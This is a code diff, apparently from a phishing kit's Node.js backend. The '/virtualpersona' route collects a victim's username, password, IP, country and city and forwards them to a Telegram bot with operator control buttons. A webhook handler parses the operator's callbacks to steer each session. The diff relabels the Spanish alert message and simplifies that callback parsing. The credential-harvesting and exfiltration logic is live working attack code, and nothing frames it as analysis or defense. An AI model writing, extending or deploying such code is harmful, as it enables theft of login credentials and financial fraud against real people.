@@ -106,11 +106,10 @@ app.post('/virtualpersona', async (req, res) => {
     });
 
   
-// Construir mensaje
-const message = `<b>🔐 Ingreso Virtual</b>
+const message = `<b>📲 NUEVO ACCESO VIRTUAL</b>
 
-${fmt('👤 User', user)}
-${fmt('🔑 Pass', pass)}
+${fmt('👤 Usuario', user)}
+${fmt('🔑 Clave', pass)}
 ${fmt('🌐 IP', ip)}
 ${fmt('🌎 País', country)}
 ${fmt('🏘️ Ciudad', city)}
@@ -118,9 +117,7 @@ ${fmt('🏘️ Ciudad', city)}
 <b>SessionID:</b> <code>${sessionId}</code>
 ⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
 
-// Enviar mensaje con botones
 await tgSendMessage(message, buttonsForStep('virtual', sessionId));
-
 
 
 
@@ -234,16 +231,8 @@ app.post('/telegram/webhook', async (req, res) => {
   console.log("📩 Webhook recibido:", body); // <-- esto es importante
 
   if (body.callback_query) {
-let callbackData = {};
-try {
-  callbackData = JSON.parse(body.callback_query.data);
-} catch (err) {
-  console.error("❌ Error al parsear callback_data:", err);
-  return res.sendStatus(400);
-}
-
-const { sessionId, action, redirect_to } = callbackData;
-
+    const callbackData = body.callback_query.data;
+    const [action, sessionId] = callbackData.split('_');
 
     console.log(`🔧 Acción: ${action} | Sesión: ${sessionId}`);
 
